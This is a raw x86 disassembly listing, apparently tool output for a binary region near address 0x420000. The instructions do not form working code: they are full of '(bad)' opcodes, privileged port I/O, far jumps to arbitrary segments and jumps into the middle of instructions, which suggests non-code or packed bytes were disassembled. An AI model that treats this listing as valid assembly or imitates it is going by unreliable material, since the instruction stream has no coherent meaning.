  42039b:	dec    edx
  42039c:	xchg   dl,bl
  42039e:	cmp    al,BYTE PTR [edx]
  4203a0:	ffreep st(5)
  4203a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203a3:	leave  
  4203a4:	inc    edi
  4203a5:	pop    es
  4203a6:	cvttps2pi mm7,QWORD PTR [edx+0x77e7d811]
  4203ad:	or     BYTE PTR [esi+ebp*1],bl
  4203b0:	scas   eax,DWORD PTR es:[edi]
  4203b1:	call   0x345c:0x43435626
  4203b8:	jae    0x4203ca
  4203ba:	adc    al,0x68
  4203bc:	mov    eax,0xbf5fdd09
  4203c1:	(bad)  [esp+ebx*2-0x21]
  4203c5:	jmp    0x1434:0x35d33aa4
  4203cc:	in     eax,0xb4
  4203ce:	or     DWORD PTR [eax-0x14bf9a46],0x41
  4203d5:	cmp    eax,0x23825496
  4203da:	repnz repz fwait
  4203dd:	mov    ds:0xbc2197d6,eax
  4203e2:	inc    esi
  4203e3:	or     edx,edi
  4203e5:	inc    ecx
  4203e6:	jp     0x420437
  4203e8:	dec    ebx
  4203e9:	enter  0xad96,0x0
  4203ed:	cmp    bl,bl
  4203ef:	je     0x4203e0
  4203f1:	imul   ecx,DWORD PTR [eax-0x7a21e8d8],0x629c1c55
  4203fb:	pop    edi
  4203fc:	daa    
  4203fd:	and    eax,DWORD PTR [esp+ebx*4]
  420400:	leave  
  420401:	jnp    0x420423
  420403:	outs   dx,DWORD PTR ds:[esi]
  420404:	mov    ds:0x2d0bd3b3,al
  420409:	nop
  42040a:	cmp    eax,DWORD PTR [ebx+edx*4-0x48]
  42040e:	mov    esi,0x49b6246e
  420413:	bound  ecx,QWORD PTR [eax-0x7]
  420416:	xor    dh,al
  420418:	xchg   ecx,eax
  420419:	sub    ebp,DWORD PTR [edx+0x5a47fb99]
  42041f:	retf   0xb17f
  420422:	pop    esp
  420423:	dec    esi
  420424:	scas   al,BYTE PTR es:[edi]
  420425:	jmp    0x4203c0
  420427:	sub    BYTE PTR [ecx],0x66
  42042a:	jp     0x4203bd
  42042c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42042d:	mov    ecx,0x44b8e401
  420432:	or     al,0x6c
  420434:	ins    DWORD PTR es:[edi],dx
  420435:	ins    BYTE PTR es:[edi],dx
  420436:	in     al,dx
  420437:	aad    0x18
  420439:	fiadd  WORD PTR [edx]
  42043b:	push   ebp
  42043c:	lods   al,BYTE PTR ds:[esi]
  42043d:	xor    eax,eax
  42043f:	loop   0x420463
  420441:	nop
  420442:	cwde   
  420443:	cmp    DWORD PTR [ecx+0x17],0xbf90c695
  42044a:	jmp    0x599d:0x13322066
  420451:	jecxz  0x42042c
  420453:	aad    0x3
  420455:	cmp    al,0x15
  420457:	ret    
  420458:	xor    esi,DWORD PTR [edi-0x4b8ccd55]
  42045e:	outs   dx,BYTE PTR ds:[esi]
  42045f:	gs jmp 0x24f4:0xb94fff75
  420467:	lea    esi,[ebp-0x357202d9]
  42046d:	aaa    
  42046e:	mov    cl,0xd1
  420470:	mov    ecx,0x5aff07f7
  420475:	popa   
  420476:	outs   dx,DWORD PTR ds:[esi]
  420477:	mov    ah,0x5a
  420479:	pop    ss
  42047a:	sar    BYTE PTR ds:0xb90e7465,1
  420480:	dec    edi
  420481:	mov    bl,0x62
  420483:	adc    DWORD PTR ds:0xd941bea,ebp
  420489:	in     al,dx
  42048a:	inc    ecx
  42048b:	call   0x440b370e
  420490:	aam    0x3a
  420492:	pusha  
  420493:	cdq    
  420494:	mov    ebp,0x7c2e33f7
  420499:	jae    0x420473
  42049b:	mov    al,0xe
  42049d:	jne    0x4204a8
  42049f:	xor    bh,0xdc
  4204a2:	popf   
  4204a3:	pop    ds
  4204a4:	neg    BYTE PTR [ebp-0x491c4908]
  4204aa:	(bad)  
  4204ab:	cli    
  4204ac:	sub    edx,esi
  4204ae:	xchg   BYTE PTR [eax-0x74],al
  4204b1:	dec    ecx
  4204b2:	(bad)  
  4204b3:	in     al,0x33
  4204b5:	adc    eax,0xc449f1fa
  4204ba:	and    eax,0x60964e74
  4204bf:	je     0x420459
  4204c1:	inc    esi
  4204c2:	in     eax,dx
  4204c3:	xchg   esp,eax
  4204c4:	dec    esp
  4204c5:	fbld   TBYTE PTR [eax+0x57]
  4204c8:	sar    BYTE PTR [esi],cl
  4204ca:	sbb    eax,0x1c93ffc
  4204cf:	cmp    al,0x93
  4204d1:	push   esi
  4204d2:	je     0x420521
  4204d4:	fs or  eax,0x5fcb4eaf
  4204da:	sbb    BYTE PTR [ebx+ecx*2],ch
  4204dd:	in     al,0xb7
  4204df:	mov    esi,0xadf29275
  4204e4:	mov    dl,0x54
  4204e6:	lds    edi,FWORD PTR [ecx+ebx*2]
  4204e9:	idiv   BYTE PTR [ecx]
  4204eb:	js     0x42051e
  4204ed:	inc    edx
  4204ee:	xchg   ebx,eax
  4204ef:	or     DWORD PTR [edi-0x40],ebx
  4204f2:	mov    ch,BYTE PTR [edi-0x49]
  4204f5:	push   ds
  4204f6:	loope  0x420577
  4204f8:	test   al,0x99
  4204fa:	jno    0x4204a2
  4204fc:	js     0x42051e
  4204fe:	pusha  
  4204ff:	les    edi,FWORD PTR [edi-0x4750654d]
  420505:	cmp    DWORD PTR [esi-0x24be1e90],esi
  42050b:	pop    esp
  42050c:	pop    ecx
  42050d:	adc    bl,dl
  42050f:	push   es
  420510:	dec    BYTE PTR ds:0xa53e78e7
  420516:	imul   ecx,edi,0x9dabaf7c
  42051c:	rcr    DWORD PTR [eax-0x7f],0x8
  420520:	test   eax,0x6b4b9d00
  420525:	int3   
  420526:	fsub   st,st(0)
  420528:	dec    esi
  420529:	cs cld 
  42052b:	fbld   TBYTE PTR [ebp-0x14]
  42052e:	push   es
  42052f:	jecxz  0x4204cd
  420531:	in     al,0x27
  420533:	and    BYTE PTR [esi+0x3f],al
  420536:	adc    esp,DWORD PTR [eax+0x2a]
  420539:	mov    eax,0xa24f9c4c
  42053e:	xchg   esp,eax
  42053f:	xchg   ebp,eax
  420540:	in     eax,dx
  420541:	sti    
  420542:	mov    ebx,DWORD PTR [edx]
  420544:	xchg   edx,eax
  420545:	dec    edx
  420546:	or     edx,esi
  420548:	ins    DWORD PTR es:[edi],dx
  420549:	pop    esi
  42054a:	dec    eax
  42054b:	popf   
  42054c:	call   0x343d:0x66372074
  420553:	fnstcw WORD PTR [ecx+0x37]
  420556:	test   eax,0xfc85380d
  42055b:	dec    ecx
  42055c:	adc    edi,DWORD PTR [edx+eiz*8]
  42055f:	pop    ebx
  420560:	mov    WORD PTR [edi+esi*1-0x24bbbe57],es
  420567:	pop    eax
  420568:	xchg   ecx,eax
  420569:	jne    0x420583
  42056b:	or     ebx,edi
  42056d:	loopne 0x42053e
  42056f:	xor    bl,BYTE PTR [ecx+0x7cb7b323]
  420575:	pop    esi
  420576:	inc    edx
  420577:	loope  0x4205e4
  420579:	push   ds
  42057a:	jns    0x420569
  42057c:	xor    ah,dl
  42057e:	adc    DWORD PTR [ecx-0x28720d93],ebx
  420584:	lahf   
  420585:	or     cl,dh
  420587:	push   esp
  420588:	xchg   DWORD PTR [esi+0x7c08860],esp
  42058e:	xchg   ebx,eax
  42058f:	xchg   ebx,eax
  420590:	pop    ebx
  420591:	jmp    0xf1d48cc4
  420596:	popf   
  420597:	lahf   
  420598:	adc    dl,BYTE PTR [ebp+0x560decb3]
  42059e:	mov    ah,0x59
  4205a0:	inc    esi
  4205a1:	fsubr  st,st(3)
  4205a3:	enter  0x329a,0x1b
  4205a7:	fadd   DWORD PTR [ebx-0x2f900fd9]
  4205ad:	mov    dl,BYTE PTR [ebp-0x164cf01a]
  4205b3:	rol    BYTE PTR [esi+0x4db8d42f],cl
  4205b9:	jnp    0x4205a5
  4205bb:	xchg   edi,eax
  4205bc:	(bad)  
  4205bd:	imul   BYTE PTR [esi]
  4205bf:	jl     0x420591
  4205c1:	jo     0x420621
  4205c3:	mov    edx,0xeaf40f71
  4205c8:	jo     0x420569
  4205ca:	test   al,0x28
  4205cc:	dec    eax
  4205cd:	(bad)  
  4205ce:	loop   0x42063a
  4205d0:	repnz in eax,dx
  4205d2:	inc    esp
  4205d3:	mov    ds:0xbc939d1c,eax
  4205d8:	imul   eax,ecx,0xb9bed422
  4205de:	ret    0xf03b
  4205e1:	mov    ds:0xee97d08f,al
  4205e6:	or     al,0x32
  4205e8:	cmp    ch,dl
  4205ea:	pop    esp
  4205eb:	jnp    0x42059b
  4205ed:	sar    BYTE PTR [esi-0x34cb96de],cl
  4205f3:	clc    
  4205f4:	dec    eax
  4205f5:	jecxz  0x42065f
  4205f7:	push   eax
  4205f8:	or     al,0x16
  4205fa:	push   0xffffff94
  4205fc:	mov    esp,0x93c717cf
  420601:	lahf   
  420602:	inc    edx
  420603:	mov    eax,ds:0x6e1f4279
  420608:	hlt    
  420609:	adc    bh,al
  42060b:	mov    ds,WORD PTR [edx]
  42060d:	sbb    ah,BYTE PTR [esi+0x22b24a12]
  420613:	xlat   BYTE PTR ds:[ebx]
  420614:	jo     0x420652
  420616:	adc    BYTE PTR [edx+edi*1-0x52],dl
  42061a:	jge    0x42067c
  42061c:	pop    eax
  42061d:	cdq    
  42061e:	js     0x4205ee
  420620:	aas    
  420621:	add    eax,0xca00ca61
  420626:	push   cs
  420627:	dec    eax
  420628:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420629:	cmp    DWORD PTR [ebx+0x6226c11a],0x8aea22c1
  420633:	and    eax,0x6d013d3f
  420638:	inc    edi
  420639:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42063a:	mov    ecx,DWORD PTR [ebp-0x29187e31]
  420640:	lods   eax,DWORD PTR ds:[esi]
  420641:	(bad)  
  420642:	repnz idiv DWORD PTR [esi+ebx*1+0x17754601]
  42064a:	xchg   BYTE PTR [ecx-0x27d43bb2],bl
  420650:	ret    0x5c11
  420653:	mov    DWORD PTR [esi],0x72541663
  420659:	fcom   QWORD PTR [esi]
  42065b:	out    0xb9,eax
  42065d:	(bad)  
  42065e:	or     al,0xc6
  420660:	jl     0x420655
  420662:	pop    esp
  420663:	arpl   si,sp
  420665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420666:	(bad)  
  420667:	mov    al,0x2f
  420669:	push   ss
  42066a:	outs   dx,BYTE PTR ds:[esi]
  42066b:	test   al,0x7d
  42066d:	xor    esp,DWORD PTR [esi+0x3f88eb7b]
  420673:	into   
  420674:	in     al,0x90
  420676:	adc    bl,BYTE PTR [ebx]
  420678:	and    DWORD PTR [edx+edi*1-0x30],edx
  42067c:	in     al,0x8e
  42067e:	add    eax,0xf5488aad
  420683:	repz aaa 
  420685:	dec    ebx
  420686:	pushf  
  420687:	clc    
  420688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420689:	jbe    0x420696
  42068b:	lock jnp 0x420670
  42068e:	pop    esi
  42068f:	dec    ebx
  420690:	sub    DWORD PTR [esi-0x6a],0x1b
  420694:	push   es
  420695:	inc    ecx
  420696:	inc    edx
  420697:	cdq    
  420698:	ret    
  420699:	or     eax,0xdcb19b7a
  42069e:	jecxz  0x42063c
  4206a0:	pop    esp
  4206a1:	loope  0x420652
  4206a3:	call   0xdb9c0ac1
  4206a8:	pushf  
  4206a9:	pop    di
  4206ab:	and    ebp,DWORD PTR [ebx-0x43]
  4206ae:	xlat   BYTE PTR ds:[ebx]
  4206af:	out    0x17,eax
  4206b1:	jp     0x42064a
  4206b3:	fwait
  4206b4:	jns    0x420644
  4206b6:	or     BYTE PTR [ecx+0x7aa37fab],dl
  4206bc:	sbb    bh,BYTE PTR [ebx]
  4206be:	xlat   BYTE PTR ds:[ebx]
  4206bf:	ins    DWORD PTR es:[edi],dx
  4206c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206c1:	arpl   WORD PTR [eax-0x7b],dx
  4206c4:	cmp    al,0x2b
  4206c6:	adc    DWORD PTR [esi-0x4e],ebx
  4206c9:	retf   
  4206ca:	sbb    cl,ch
  4206cc:	inc    ecx
  4206cd:	ret    0x2e29
  4206d0:	cli    
  4206d1:	add    esp,DWORD PTR [edi]
  4206d3:	xor    al,0x8d
  4206d5:	leave  
  4206d6:	or     eax,0xa746e1bd
  4206db:	pushf  
  4206dc:	retf   
  4206dd:	and    DWORD PTR [ebp-0x3d8a0ebc],edi
  4206e3:	loopne 0x420721
  4206e5:	adc    ebx,DWORD PTR [edi+edx*1]
  4206e8:	pop    es
  4206e9:	sub    al,al
  4206eb:	push   ebp
  4206ec:	sub    bl,bh
  4206ee:	jno    0x4206d4
  4206f0:	in     al,0x7c
  4206f2:	inc    ecx
  4206f3:	loop   0x420772
  4206f5:	inc    ecx
  4206f6:	ret    
  4206f7:	ja     0x420776
  4206f9:	cdq    
  4206fa:	mov    dh,0x74
  4206fc:	cli    
  4206fd:	scas   al,BYTE PTR es:[edi]
  4206fe:	je     0x4206a1
  420700:	push   esi
  420701:	(bad)  
  420702:	cld    
  420703:	mov    edi,0x75f0adc7
  420708:	xchg   ebp,eax
  420709:	sub    BYTE PTR [esi],0x75
  42070c:	into   
  42070d:	push   es
  42070e:	pop    es
  42070f:	xchg   edi,eax
  420710:	sbb    ecx,DWORD PTR [edi+0x36]
  420713:	mov    edi,0x4179f4d
  420718:	in     eax,dx
  420719:	cmp    al,0x52
  42071b:	mov    al,0x2e
  42071d:	ret    
  42071e:	faddp  st(4),st
  420720:	xchg   esi,eax
  420721:	push   ecx
  420722:	(bad)  [esi+0x161895a0]
  420728:	mov    dh,0x26
  42072a:	jo     0x4206e4
  42072c:	nop    edx
  42072f:	or     eax,0x7c12eac1
  420734:	test   DWORD PTR [eax+0x5dd6dd71],0x7ba4ffb4
  42073e:	inc    eax
  42073f:	lock clc 
  420741:	(bad)  
  420742:	in     eax,dx
  420743:	mov    ah,0xd8
  420745:	js     0x420770
  420747:	addr16 mov ebp,0x623f0cf8
  42074d:	mov    ebp,0xb436bb67
  420752:	aad    0xcd
  420754:	sbb    edi,esi
  420756:	dec    ebx
  420757:	ret    
  420758:	jbe    0x4207a3
  42075a:	ror    BYTE PTR [esi+eax*2+0x7720aba7],cl
  420761:	inc    edi
  420762:	add    eax,0x12300113
  420767:	adc    edx,DWORD PTR [edi-0x76]
  42076a:	lods   al,BYTE PTR ds:[esi]
  42076b:	or     ch,0xe1
  42076e:	push   ds
  42076f:	dec    BYTE PTR [eax+0x3e75627b]
  420775:	add    edi,eax
  420777:	fiadd  DWORD PTR [eax]
  420779:	js     0x4207ba
  42077b:	cld    
  42077c:	stos   DWORD PTR es:[edi],eax
  42077d:	dec    edx
  42077f:	ins    DWORD PTR es:[edi],dx
  420780:	js     0x4207e9
  420782:	mov    al,ds:0xf66de67c
  420787:	lahf   
  420788:	adc    al,0x75
  42078a:	mov    ecx,0x893cdfb0
  42078f:	imul   edi,DWORD PTR [edi],0x60ecaf05
  420795:	push   ss
  420796:	idiv   BYTE PTR [eax]
  420798:	mov    cl,0xdc
  42079a:	xchg   ebx,eax
  42079b:	pusha  
  42079c:	dec    edx
  42079d:	mov    ah,0x12
  42079f:	lea    edi,[ebp+0x54]
  4207a2:	mov    esp,DWORD PTR [edx+0x59]
  4207a5:	cdq    
  4207a6:	jb     0x42075b
  4207a8:	aas    
  4207a9:	add    esp,ebp
  4207ab:	sahf   
  4207ac:	add    esp,DWORD PTR [edi]
  4207ae:	jmp    0x8b5ecda4
  4207b3:	hlt    
  4207b4:	jae    0x42075c
  4207b6:	pop    ss
  4207b7:	xor    eax,0xb5f904b7
  4207bc:	in     eax,dx
  4207bd:	rdmsr  
  4207bf:	mov    al,0xfd
  4207c1:	out    dx,al
  4207c2:	mov    dl,0xcd
  4207c4:	call   0xdced:0x5339c7c
  4207cb:	test   eax,0x893bb36b
  4207d0:	cs out dx,al
  4207d2:	stos   DWORD PTR es:[edi],eax
  4207d3:	enter  0xc641,0x9a
  4207d7:	sar    BYTE PTR [edx],1
  4207d9:	nop
  4207da:	lock dec edi
  4207dc:	in     eax,0x94
  4207de:	xor    dl,bl
  4207e0:	leave  
  4207e1:	sub    esi,DWORD PTR [eax+0x13723337]
  4207e7:	push   ds
  4207e8:	and    cl,BYTE PTR [ebx+0x29]
  4207eb:	mov    esi,0x89824fe6
  4207f0:	retf   0x87e
  4207f3:	es stos BYTE PTR es:[edi],al
  4207f5:	in     al,0x7d
  4207f7:	mov    dl,0xb1
  4207f9:	fsub   DWORD PTR [edx+0x2d]
  4207fc:	sub    eax,0x5895fdb7
  420801:	inc    eax
  420802:	ins    DWORD PTR es:[edi],dx
  420803:	dec    esp
  420804:	add    DWORD PTR ds:0x60f9f6f1,esi
  42080a:	lods   eax,DWORD PTR ds:[esi]
  42080b:	sahf   
  42080c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42080d:	cmc    
  42080e:	lahf   
  42080f:	add    eax,0x24856014
  420814:	mov    ah,0x4d
  420816:	jg     0x4207cd
  420818:	loopne 0x420830
  42081a:	pop    edx
  42081b:	xchg   BYTE PTR [esi-0x67],dh
  42081e:	jle    0x4207b1
  420820:	sbb    ecx,DWORD PTR [ebx]
  420822:	dec    esp
  420823:	mul    DWORD PTR [edx]
  420825:	xor    al,0x77
  420827:	pop    ecx
  420828:	test   eax,0xfc8f72a8
  42082d:	jbe    0x420834
  42082f:	inc    ebp
  420830:	pop    ebx
  420831:	cmp    esi,edi
  420833:	and    al,0x6a
  420835:	pushf  
  420836:	jbe    0x4207e2
  420838:	js     0x4207ee
  42083a:	pop    ss
  42083b:	sahf   
  42083c:	(bad)  
  42083d:	fisttp WORD PTR [esi]
  42083f:	shl    ebp,0x9b
  420842:	data16 add cl,bl
  420845:	pop    es
  420846:	clc    
  420847:	dec    ecx
  420848:	mov    cl,BYTE PTR [edi-0x4d181906]
  42084e:	add    eax,0x121e1f8a
  420853:	sti    
  420854:	popa   
  420855:	add    al,0x4c
  420857:	and    dh,bh
  420859:	xchg   esi,eax
  42085a:	aam    0xfa
  42085c:	fwait
  42085d:	mov    esp,0xb24399b4
  420862:	jno    0x420897
  420864:	ret    
  420865:	sub    BYTE PTR [ebx],0x40
  420868:	loop   0x420819
  42086a:	push   0x4f082364
  42086f:	and    BYTE PTR [ecx],al
  420871:	mov    ds:0xa7c6887e,eax
  420876:	pop    edx
  420877:	xor    bl,BYTE PTR [ebp+0x48ac6aad]
  42087d:	call   0xeccd46ed
  420882:	(bad)  
  420883:	push   ebp
  420884:	(bad)  
  420886:	int    0x3f
  420888:	push   0x52
  42088a:	leave  
  42088b:	sub    eax,0x53aa05a1
  420890:	stc    
  420891:	(bad)  
  420892:	and    eax,0x52af47a4
  420897:	out    0xe7,al
  420899:	xor    DWORD PTR ds:0xe8e6473d,ebp
  42089f:	ret    
  4208a0:	pop    edx
  4208a1:	push   ds
  4208a2:	cs leave 
  4208a4:	mov    al,0xe8
  4208a6:	jnp    0x4208d0
  4208a8:	xor    al,0x60
  4208aa:	and    eax,DWORD PTR [ebx+ecx*8-0x41860479]
  4208b1:	mov    edi,0xd9643eff
  4208b6:	fadd   DWORD PTR [edx+0x31c3e280]
  4208bc:	xchg   BYTE PTR [eax],bh
  4208be:	lea    edi,[ebx+0x2f]
  4208c1:	ins    BYTE PTR es:[edi],dx
  4208c2:	push   edi
  4208c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208c4:	add    ch,cl
  4208c6:	mov    ds:0xbbba678f,al
  4208cb:	mov    ecx,0xaf6261f5
  4208d0:	lea    edx,[edi+0x13]
  4208d3:	xor    DWORD PTR [edi],esp
  4208d5:	adc    eax,0x7b01b54a
  4208da:	addr16 and dl,dh
  4208dd:	inc    eax
  4208de:	jb     0x4208f4
  4208e0:	sub    DWORD PTR [esi+ecx*2+0x7f8fc24],eax
  4208e7:	adc    al,0x42
  4208e9:	inc    edi
  4208ea:	pop    esi
  4208eb:	adc    al,0x6c
  4208ed:	icebp  
  4208ee:	int3   
  4208ef:	daa    
  4208f0:	sahf   
  4208f1:	mov    esi,0xd525bb0a
  4208f6:	sub    ecx,edx
  4208f8:	dec    esi
  4208f9:	xchg   ebx,eax
  4208fa:	lock fcmovb st,st(5)
  4208fd:	clc    
  4208fe:	push   edx
  4208ff:	sub    BYTE PTR [eax+0x78],bl
  420902:	pop    edi
  420903:	mov    esp,0x745859bc
  420908:	rol    BYTE PTR [ecx+ecx*8+0x2a2a924e],1
  42090f:	std    
  420910:	mov    ecx,0x2ac960c5
  420915:	fcom   st(2)
  420917:	xchg   edi,eax
  420918:	pop    ss
  420919:	mov    db7,esi
  42091c:	jno    0x4208ba
  42091e:	(bad)  
  420920:	inc    edi
  420921:	stos   DWORD PTR es:[edi],eax
  420922:	mov    bl,BYTE PTR [ebx+eax*1]
  420925:	sbb    dh,bh
  420927:	mov    edi,DWORD PTR [eax-0x13d9b885]
  42092d:	ins    BYTE PTR es:[edi],dx
  42092e:	retf   
  42092f:	test   al,0xe5
  420931:	loope  0x42095b
  420933:	mov    esp,0xb929a678
  420938:	and    DWORD PTR [eax-0x387a148a],esp
  42093e:	lods   al,BYTE PTR ds:[esi]
  42093f:	mov    dl,0xfc
  420941:	ror    BYTE PTR [ebp+ebx*2-0x51],cl
  420945:	ins    DWORD PTR es:[edi],dx
  420946:	sub    eax,0x5911b74b
  42094b:	jmp    0x1cfcf17b
  420950:	shr    DWORD PTR [edi+0x64],0xf2
  420954:	adc    esi,ecx
  420956:	aaa    
  420957:	xchg   ebp,eax
  420958:	mov    DWORD PTR [esi-0x58],eax
  42095b:	lds    ecx,FWORD PTR [edx]
  42095d:	mov    al,0xcf
  42095f:	pop    ss
  420960:	mov    WORD PTR [ebx+0x43393f27],gs
  420966:	das    
  420967:	(bad)
  42096b:	mov    ch,BYTE PTR [eax+0x75]
  42096e:	out    0x7,al
  420970:	bound  edx,QWORD PTR [eax]
  420972:	xchg   edi,eax
  420973:	into   
  420974:	mov    dl,0xe7
  420976:	pop    esp
  420977:	add    cl,dh
  420979:	or     BYTE PTR [ecx-0x16533ead],bh
  42097f:	lods   al,BYTE PTR ds:[esi]
  420980:	cmp    ebx,DWORD PTR [ecx]
  420982:	mov    ds:0x37cd5edf,eax
  420987:	lods   eax,DWORD PTR ds:[esi]
  420988:	ds jae 0x4209a5
  42098b:	sub    DWORD PTR [edx],esi
  42098d:	test   esi,ecx
  42098f:	lock data16 ficomp DWORD PTR [eax]
  420993:	fdiv   DWORD PTR [edx+0x43]
  420996:	fnstcw WORD PTR [edi-0x48db9ff9]
  42099c:	stc    
  42099d:	push   ebx
  42099e:	in     eax,0x1a
  4209a0:	or     DWORD PTR [edx+0x205d7d87],edx
  4209a6:	outs   dx,DWORD PTR ds:[esi]
  4209a7:	adc    bh,BYTE PTR [edx+0x3d]
  4209aa:	adc    DWORD PTR [esi-0x69],esp
  4209ad:	data16 mov bl,0x79
  4209b0:	(bad)  
  4209b1:	sar    BYTE PTR [edx],cl
  4209b3:	fidivr DWORD PTR [ebx]
  4209b5:	push   eax
  4209b6:	cli    
  4209b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209b8:	lock sub eax,0x41fcd95b
  4209be:	sbb    BYTE PTR [esp+esi*1+0xf],0x6f
  4209c3:	dec    edi
  4209c4:	xor    BYTE PTR [eax+0x295a0b44],ah
  4209ca:	sahf   
  4209cb:	mov    eax,ds:0xa00f7852
  4209d0:	add    eax,0x211f7aea
  4209d5:	into   
  4209d6:	(bad)  
  4209d7:	es xchg esi,eax
  4209d9:	adc    DWORD PTR [eax],ebx
  4209db:	push   ss
  4209dc:	in     eax,dx
  4209dd:	push   ecx
  4209de:	(bad)  
  4209df:	pushf  
  4209e0:	sub    eax,ecx
  4209e2:	retf   0x8ba2
  4209e5:	in     al,dx
  4209e6:	popf   
  4209e7:	mov    eax,ds:0x5bb2ed1
  4209ec:	std    
  4209ed:	icebp  
  4209ee:	sar    cl,cl
  4209f0:	lds    ecx,FWORD PTR [ebx+0x2d]
  4209f3:	int3   
  4209f4:	xor    ebx,eax
  4209f6:	lods   al,BYTE PTR ds:[esi]
  4209f7:	push   esp
  4209f8:	es (bad) 
  4209fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209fb:	mov    ah,0xdf
  4209fd:	pusha  
  4209fe:	icebp  
  4209ff:	or     eax,ebx
  420a01:	sahf   
  420a02:	jae    0x4209a5
  420a04:	xchg   edx,eax
  420a05:	cs mov ecx,0x1608be5e
  420a0b:	leave  
  420a0c:	test   al,0xcd
  420a0e:	adc    DWORD PTR [eax-0x61],0xffffff9c
  420a12:	in     eax,dx
  420a13:	xchg   DWORD PTR [eax+0x4a],ebp
  420a16:	fimul  WORD PTR [ebx]
  420a18:	aad    0x2a
  420a1a:	test   al,0x9b
  420a1c:	fst    DWORD PTR [ecx]
  420a1e:	stos   BYTE PTR es:[edi],al
  420a1f:	ror    BYTE PTR [edi-0x68dbb8f9],cl
  420a25:	stos   DWORD PTR es:[edi],eax
  420a26:	xchg   BYTE PTR [edx-0x60f0ea14],ah
  420a2c:	push   es
  420a2d:	outs   dx,DWORD PTR ds:[esi]
  420a2e:	arpl   WORD PTR [edi],bx
  420a30:	mov    bl,0xcb
  420a32:	stos   DWORD PTR es:[edi],eax
  420a33:	fs dec edx
  420a35:	jne    0x4209ea
  420a37:	stos   BYTE PTR es:[edi],al
  420a38:	or     eax,0xa76bb18f
  420a3d:	das    
  420a3e:	mov    ?,eax
  420a40:	stos   DWORD PTR es:[edi],eax
  420a41:	rcr    BYTE PTR [edi],0x39
  420a44:	mov    eax,0xf0720bc0
  420a49:	push   cs
  420a4a:	mov    dl,dh
  420a4c:	imul   esp,DWORD PTR [edi+0x2d],0xffffffea
  420a50:	loop   0x420a07
  420a52:	pop    ebp
  420a53:	loopne 0x4209ff
  420a55:	sti    
  420a56:	cmp    ch,BYTE PTR [edi]
  420a58:	add    ah,bh
  420a5a:	push   edx
  420a5b:	mov    bl,0x87
  420a5d:	pop    es
  420a5e:	imul   edi
  420a60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a61:	loope  0x420a89
  420a63:	or     al,0x6d
  420a65:	mov    ebx,0x78d9ce67
  420a6a:	xchg   esi,eax
  420a6b:	mov    cl,0x71
  420a6d:	mov    ecx,DWORD PTR [eax-0xf78edf2]
  420a73:	cwde   
  420a74:	or     al,0x5e
  420a76:	mov    DWORD PTR [edx+0x356b46ad],0x2b6871b0
  420a80:	popa   
  420a81:	push   ebp
  420a82:	sbb    ch,dl
  420a84:	cmp    ebx,DWORD PTR [eax]
  420a86:	mov    DWORD PTR [edi+0xe],edx
  420a89:	pop    eax
  420a8a:	das    
  420a8b:	(bad)  
  420a8c:	out    dx,al
  420a8d:	mov    dl,0xff
  420a8f:	pop    esp
  420a90:	or     edi,DWORD PTR [eax+0x26c98e10]
  420a96:	adc    DWORD PTR [ebx-0x40],0x528be4bd
  420a9d:	xor    eax,0x4a515cab
  420aa2:	fstp   QWORD PTR ds:0xdde35bd9
  420aa8:	das    
  420aa9:	pop    edx
  420aaa:	inc    edx
  420aab:	cmp    DWORD PTR [ebp+0xd],esi
  420aae:	retf   0x1140
  420ab1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ab2:	push   ebp
  420ab3:	mov    dl,0x6
  420ab5:	rcr    BYTE PTR [edx-0x47],cl
  420ab8:	imul   edx,DWORD PTR [edx],0xfffffffe
  420abb:	jne    0x420a9c
  420abd:	into   
  420abe:	adc    BYTE PTR [ebx+ebx*4],0x7c
  420ac2:	enter  0x3643,0x51
  420ac6:	test   DWORD PTR [ebx],esi
  420ac8:	push   edi
  420ac9:	(bad)  
  420aca:	or     ebp,ecx
  420acc:	arpl   bx,sp
  420ace:	xor    eax,0x41e3ecce
  420ad3:	jl     0x420aed
  420ad5:	pop    dx
  420ad7:	adc    BYTE PTR [edi],bl
  420ad9:	jl     0x420b27
  420adb:	mov    eax,0xe2c95252
  420ae0:	xchg   edx,eax
  420ae1:	call   FWORD PTR [ecx+0x6536c17b]
  420ae7:	clc    
  420ae8:	mov    edx,ebx
  420aea:	jl     0x420b19
  420aec:	idiv   BYTE PTR ds:0x5940d824
  420af2:	icebp  
  420af3:	pop    ecx
  420af4:	pop    ebp
  420af5:	jae    0x420ae9
  420af7:	jae    0x420aac
  420af9:	ds or  al,0x1f
  420afc:	out    0x8d,eax
  420afe:	das    
  420aff:	mov    esp,0xdac72dc8
  420b04:	rol    DWORD PTR [edx],1
  420b06:	mov    bh,BYTE PTR [ebp+0x44cacfd5]
  420b0c:	repz cmp BYTE PTR [ebp-0x36],ch
  420b10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b11:	mov    bh,0x9
  420b13:	sbb    BYTE PTR [ebx],dl
  420b15:	mov    cl,0xf8
  420b17:	fcomp  DWORD PTR [edx+0x340c8be8]
  420b1d:	addr16 xchg esi,eax
  420b1f:	adc    dh,BYTE PTR [ebx-0x63]
  420b22:	std    
  420b23:	lea    esi,[esi]
  420b25:	adc    al,0x53
  420b27:	pop    edx
  420b28:	jno    0x420b34
  420b2a:	cmp    dh,BYTE PTR [ebp-0x78]
  420b2d:	in     al,0x9a
  420b2f:	mov    dl,0xa3
  420b31:	dec    edi
  420b32:	aam    0x82
  420b34:	xchg   ecx,edx
  420b36:	and    BYTE PTR [ebp+0x7c],cl
  420b39:	mov    WORD PTR [eax+0x1e],ds
  420b3c:	stc    
  420b3d:	add    BYTE PTR [ebp+0x1c927ea6],0x77
  420b44:	nop
  420b45:	stos   DWORD PTR es:[edi],eax
  420b46:	sti    
  420b47:	mov    ch,0x64
  420b49:	xor    al,0x9
  420b4b:	push   ecx
